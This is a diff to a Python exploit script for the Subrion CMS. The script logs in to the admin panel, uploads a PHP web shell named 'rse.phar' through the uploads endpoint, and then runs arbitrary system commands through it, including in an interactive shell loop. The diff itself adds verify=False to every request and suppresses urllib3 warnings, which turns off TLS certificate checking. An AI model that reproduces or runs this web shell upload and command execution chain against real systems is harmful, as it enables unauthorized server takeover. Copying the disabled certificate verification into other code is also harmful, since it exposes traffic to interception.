@@ -24,7 +24,8 @@ class Subrion:
             return fixed_url
 
     def get_csrf(self):
-        csrf = self.session.get(self.url)
+        requests.packages.urllib3.disable_warnings()
+        csrf = self.session.get(self.url, verify=False)
         print("Getting security token:")
         try:
             token = re.findall("securityToken = '(.*)';",csrf.text)
@@ -34,19 +35,21 @@ class Subrion:
             print("Unable to get token :(")
 
     def login(self):
+        requests.packages.urllib3.disable_warnings()
         print("Login in:")
         login_data = {
             "__st":self.token,
             "username":self.username,
             "password":self.password
         }
-        login = self.session.post(self.url,data=login_data)
+        login = self.session.post(self.url,data=login_data, verify=False)
         if "Dashboard" in login.text:
             print("Logged in!")
         else:
             print("Unable to log in :(")
     
     def upload(self):
+        requests.packages.urllib3.disable_warnings()
         print("Uploading file for RCE")
         upload_url = self.url + "uploads/read.json"
         payload = "<?php echo system($_REQUEST['rse']); ?>"
@@ -59,10 +62,10 @@ class Subrion:
             'upload[]':('rse.phar',payload,{'Content-Type':'application/octet-stream'},{'Content-Disposition':'form-data'}),
         }
 
-        self.session.post(upload_url,data=file_data,files=file_content)
+        self.session.post(upload_url,data=file_data,files=file_content, verify=False)
         file_dir = self.url.replace("panel","uploads")
 
-        file_url = self.session.get(file_dir + "rse.phar")
+        file_url = self.session.get(file_dir + "rse.phar", verify=False)
 
         if file_url.status_code == 200:
             print("File uploaded")
@@ -71,6 +74,7 @@ class Subrion:
             print("Something went wrong with the upload")
 
     def commands(self,file_url):
+        requests.packages.urllib3.disable_warnings()
         if args.shell:
             while True:
                 try:
@@ -78,7 +82,7 @@ class Subrion:
                     rce_data = {
                         "rse":cmd
                     }
-                    rce_url = self.session.post(file_url,data=rce_data)
+                    rce_url = self.session.post(file_url,data=rce_data, verify=False)
                     print(rce_url.text)
                 except KeyboardInterrupt:
                     print("Bye Bye!\n")
@@ -88,7 +92,7 @@ class Subrion:
             rce_data = {
                 "rse":self.rce
             }
-            rce_url = self.session.post(file_url,data=rce_data)
+            rce_url = self.session.post(file_url,data=rce_data, verify=False)
             print(rce_url.text)
 
 if __name__=="__main__":
